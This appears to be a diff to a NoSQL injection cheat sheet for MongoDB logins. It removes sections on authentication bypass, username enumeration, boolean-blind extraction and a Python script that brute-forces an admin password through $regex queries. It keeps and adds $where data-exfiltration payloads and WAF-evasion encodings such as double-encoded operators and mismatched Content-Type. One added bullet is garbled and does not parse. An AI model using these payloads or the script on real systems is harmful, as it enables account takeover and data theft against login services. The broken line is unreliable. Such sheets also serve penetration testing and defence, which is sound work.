@@ -35,29 +35,6 @@ username[$nin][0]=x&password[$nin][0]=x
 {"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
 ```
 
-## Authentication Bypass
-
-Bypass login — match any user/password:
-```json
-{"username": {"$ne": ""}, "password": {"$ne": ""}}
-```
-
-Target specific user:
-```json
-{"username": "admin", "password": {"$gt": ""}}
-```
-
-Bypass with $regex:
-```json
-{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
-```
-
-```
-# URL-encoded equivalent
-username=admin&password[$ne]=x
-username[$ne]=invalid&password[$ne]=invalid
-```
-
 ## Data Extraction via $regex
 
 ### Password Length Detection
@@ -78,34 +55,7 @@ Increment length until response changes.
 {"username": "admin", "password": {"$regex": "^abc"}}
 ```
 
-### Username Enumeration
-
-```json
-{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
-{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
-{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
-```
-
 ## Blind NoSQL Injection
-
-### Boolean-Based
-
-True condition:
-```json
-{"username": "admin", "password": {"$ne": ""}}
-```
-
-False condition:
-```json
-{"username": "admin", "password": {"$eq": "definitelywrong"}}
-```
-
-Extract data character by character:
-```json
-{"username": "admin", "password": {"$regex": "^p"}}
-{"username": "admin", "password": {"$regex": "^pa"}}
-{"username": "admin", "password": {"$regex": "^pas"}}
-```
 
 ### Time-Based (via $where)
 
@@ -127,12 +77,10 @@ Data exfiltration via `$where` (MongoDB < 4.2, sandboxed JS — no filesystem/RC
 {"$where": "function(){return this.username == tojsononeline(this)}"}
 ```
 
-Combined query:
-```json
-{"username": {"$gt": ""}, "$where": "this.username == 'admin'"}
-```
-
-Note: `$where` is deprecated in MongoDB 4.2+ and disabled by default with `--noscripting`. Server-side JS runs in a sandbox with no `require()`, filesystem, or network access — it enables data exfiltration, not RCE.
+Note: server-side JavaScript (`$where`, `$function`, `$accumulator`) is enabled by default; it is
+deprecated in MongoDB 8.0 and off only where `security.javascriptEnabled: false` (or `--noscripting`)
+is set. It runs with no `require()`, filesystem or network access: it enables data exfiltration and
+timing oracles, not RCE.
 
 ## Other Operators
 
@@ -150,13 +98,6 @@ Note: `$where` is deprecated in MongoDB 4.2+ and disabled by default with `--nos
 ```
 
 Type 2 = string, can bypass type checks.
-
-### $or / $and
-
-```json
-{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}
-{"$and": [{"username": {"$regex": "^a"}}, {"password": {"$ne": ""}}]}
-```
 
 ## WAF Bypass Techniques
 
@@ -178,28 +119,8 @@ Type 2 = string, can bypass type checks.
 username=admin&password[$ne]=&password[$ne]=x
 ```
 
-## Automation Script
+### Equivalent operators and encodings
 
-```python
-import requests
-import string
-
-url = "http://target/login"
-password = ""
-chars = string.ascii_lowercase + string.digits
-
-while True:
-    found = False
-    for c in chars:
-        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
-        r = requests.post(url, json=payload)
-        if "success" in r.text or r.status_code == 302:
-            password += c
-            print(f"Found: {password}")
-            found = True
-            break
-    if not found:
-        break
-
-print(f"Password: {password}")
-```
+- `{"$not": {"$eq": "wrong"}}` and `{"$nin": []}` behave like `$ne` with names filters key on less.
+- `%2524ne` passes single-decode WAFs.
+- A JSON body sent with a form `Content-Type` slips past WAFs that inspect only the declared type.
